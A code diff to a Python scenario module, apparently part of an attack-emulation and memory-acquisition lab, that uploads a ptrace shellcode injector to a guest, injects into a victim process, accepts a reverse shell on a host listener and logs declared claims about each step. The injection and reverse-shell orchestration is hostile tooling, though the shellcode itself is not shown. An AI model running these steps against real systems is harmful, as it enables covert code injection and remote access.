@@ -6,10 +6,12 @@ import socket
 from collections.abc import Callable
 from pathlib import Path
 
+from paramiko import SSHException
+
 from orchestrator.core import console
 from orchestrator.core.provenance import file_sha256
 from orchestrator.core.ssh_client import SSHClient
-from scenarios.command_log import record_operation, run_logged_command
+from scenarios.command_log import CommandLog, ScenarioClaim
 from scenarios.ptrace_fa import shellcode
 
 SCENARIO_ID = "user_procinj_ptracefa"
@@ -44,7 +46,59 @@ VICTIM_ARTIFACTS = tuple(f"/tmp/ptrace_fa-{name}" for name in ARTIFACT_NAMES)
 # Backgrounded, nohup'd, and disowned so the victim (and the shell it later
 # forks) survive the terminal closing while the run continues toward
 # acquisition.
-START_VICTIM_COMMAND = f"nohup ./victim >{VICTIM_ROOT}/victim.log 2>&1 & disown; echo $!"
+START_VICTIM_COMMAND = (
+    f"nohup ./victim >{VICTIM_ROOT}/victim.log 2>&1 & disown; echo $!"
+)
+
+
+def get_scenario_claims() -> list[ScenarioClaim]:
+    """Declare expected effects from successful scenario execution."""
+    return [
+        {
+            "id": "binaries_installed",
+            "statement": "The prepared injector and victim binaries were installed under /tmp.",
+            "basis": [
+                "command_log.jsonl#upload_artifact",
+                "command_log.jsonl#install_shellcode_inject_fa",
+                "command_log.jsonl#install_victim",
+                "inputs/ptrace/shellcode_inject_fa",
+                "inputs/ptrace/victim",
+            ],
+            "basis_type": "successful_execution_and_scenario_fact",
+            "validation_limit": "Installation success does not independently verify final guest bytes or their persistence until acquisition.",
+        },
+        {
+            "id": "victim_started",
+            "statement": "The victim process was started and its PID was captured.",
+            "basis": ["command_log.jsonl#start_victim"],
+            "basis_type": "successful_command",
+            "validation_limit": "The recorded launch and PID do not establish the complete process lifetime or state at capture.",
+        },
+        {
+            "id": "injector_executed",
+            "statement": "The ptrace injector completed against the recorded victim PID.",
+            "basis": ["command_log.jsonl#inject_shellcode"],
+            "basis_type": "successful_command",
+            "validation_limit": "Injector exit status alone does not prove shellcode execution; the reverse-shell check supplies behavioral validation.",
+        },
+        {
+            "id": "reverse_shell_validated",
+            "statement": "The reverse shell returned the expected execution identity.",
+            "basis": ["command_log.jsonl#validate_reverse_shell"],
+            "basis_type": "successful_command",
+            "validation_limit": "Validated before capture; the retained connection is not independently revalidated during acquisition.",
+        },
+        {
+            "id": "victim_survived",
+            "statement": "The victim passed the post-injection kill -0 check.",
+            "basis": [
+                "command_log.jsonl#check_victim_alive",
+                "command_log.jsonl#validate_victim_survived",
+            ],
+            "basis_type": "successful_commands",
+            "validation_limit": "This establishes existence at the check, not later process health.",
+        },
+    ]
 
 
 def build(ssh: SSHClient, staging: Path) -> tuple[tuple[Path, Path], str]:
@@ -92,8 +146,8 @@ def run_ptrace_fa(
     transcript_path.touch()
     listener = _open_listener()
     console.scope("HOST", "stage ptrace_fa artifacts")
-    _upload_artifacts(ssh, command_log_path, artifact_paths)
     terminal = ssh.open_terminal()
+    log = CommandLog(terminal, command_log_path)
     reverse_shell = None
 
     def close_reverse_shell() -> None:
@@ -104,13 +158,13 @@ def run_ptrace_fa(
         reverse_shell = None
 
     try:
+        _upload_artifacts(ssh, log, artifact_paths)
         with terminal:
             console.scope("GUEST", "verify prepared artifacts")
-            guest_identity = run_logged_command(
-                terminal,
-                command_log_path,
+            guest_identity = log.run(
+                "guest_identity",
                 ". /etc/os-release; "
-                "printf '%s-%s %s\\n' \"$ID\" \"$VERSION_ID\" \"$(uname -m)\"",
+                'printf \'%s-%s %s\\n\' "$ID" "$VERSION_ID" "$(uname -m)"',
                 timeout=180,
             ).combined_output
             try:
@@ -122,57 +176,54 @@ def run_ptrace_fa(
                     raise RuntimeError(
                         f"ptrace_fa artifacts target {expected}, guest is {guest_identity}"
                     )
-            except Exception as exc:
-                record_operation(
-                    command_log_path, "verify_guest_identity", error=str(exc)
-                )
+            except (OSError, RuntimeError, SSHException) as exc:
+                log.note("verify_guest_identity", error=str(exc))
                 raise
-            record_operation(command_log_path, "verify_guest_identity")
+            log.note("verify_guest_identity")
 
             console.scope("GUEST", "prepare binaries")
             for source, name in zip(VICTIM_ARTIFACTS, ARTIFACT_NAMES, strict=True):
-                run_logged_command(
-                    terminal,
-                    command_log_path,
+                log.run(
+                    f"install_{name}",
                     f"install -m 0755 {source} {VICTIM_ROOT}/{name}",
                 )
-            run_logged_command(terminal, command_log_path, f"cd {VICTIM_ROOT}")
+            log.run("enter_working_directory", f"cd {VICTIM_ROOT}")
 
             console.scope("GUEST", "start victim")
-            identity = run_logged_command(
-                terminal, command_log_path, "id -un"
-            ).combined_output.strip()
+            identity = log.run("execution_identity", "id -un").combined_output.strip()
             # Interactive job control prints a "[1] <pid>" notice before the
             # echo output, so only the last line is the captured PID.
-            victim_output = run_logged_command(
-                terminal, command_log_path, START_VICTIM_COMMAND
+            victim_output = log.run(
+                "start_victim", START_VICTIM_COMMAND
             ).combined_output.strip()
             victim_pid = victim_output.splitlines()[-1].strip()
             if not victim_pid.isdigit():
                 raise RuntimeError(f"Victim PID was not captured: {victim_output!r}")
 
             console.scope("GUEST", "inject shellcode")
-            run_logged_command(
-                terminal,
-                command_log_path,
+            log.run(
+                "inject_shellcode",
                 f"./shellcode_inject_fa {victim_pid}",
                 timeout=30,
             )
 
             console.scope("HOST", "validate reverse shell")
             try:
-                shell_identity, reverse_shell = _accept_reverse_shell(listener, identity)
-            except Exception as exc:
-                record_operation(command_log_path, "validate_reverse_shell", error=str(exc))
+                shell_identity, reverse_shell = _accept_reverse_shell(
+                    listener, identity
+                )
+            except (OSError, RuntimeError, SSHException) as exc:
+                log.note("validate_reverse_shell", error=str(exc))
                 raise
-            record_operation(command_log_path, "validate_reverse_shell")
+            log.note("validate_reverse_shell")
 
             console.scope("GUEST", "validate victim survived")
-            survived = run_logged_command(
-                terminal, command_log_path, f"kill -0 {victim_pid} && echo alive"
+            survived = log.run(
+                "check_victim_alive", f"kill -0 {victim_pid} && echo alive"
             ).combined_output.strip()
             if survived != "alive":
                 raise RuntimeError("Victim process did not survive injection")
+            log.note("validate_victim_survived")
     except BaseException:
         close_reverse_shell()
         raise
@@ -187,9 +238,7 @@ def run_ptrace_fa(
     try:
         facts = {
             "victim_pid": int(victim_pid),
-            "victim_process_survived_injection": True,
             "reverse_shell_identity": shell_identity,
-            "reverse_shell_connection_open_at_scenario_completion": True,
             "listener_host": LISTENER_HOST,
             "listener_port": LISTENER_PORT,
         }
@@ -202,19 +251,17 @@ def run_ptrace_fa(
 
 def _upload_artifacts(
     ssh: SSHClient,
-    command_log_path: Path,
+    log: CommandLog,
     artifact_paths: tuple[Path, Path],
 ) -> None:
     console.step("uploading ptrace_fa artifacts...")
     try:
-        for artifact, remote_path in zip(
-            artifact_paths, VICTIM_ARTIFACTS, strict=True
-        ):
+        for artifact, remote_path in zip(artifact_paths, VICTIM_ARTIFACTS, strict=True):
             ssh.put(artifact, remote_path)
-    except Exception as exc:
-        record_operation(command_log_path, "upload_artifact", error=str(exc))
+    except (OSError, RuntimeError, SSHException) as exc:
+        log.note("upload_artifact", error=str(exc))
         raise
-    record_operation(command_log_path, "upload_artifact")
+    log.note("upload_artifact")
 
 
 def _open_listener() -> socket.socket:
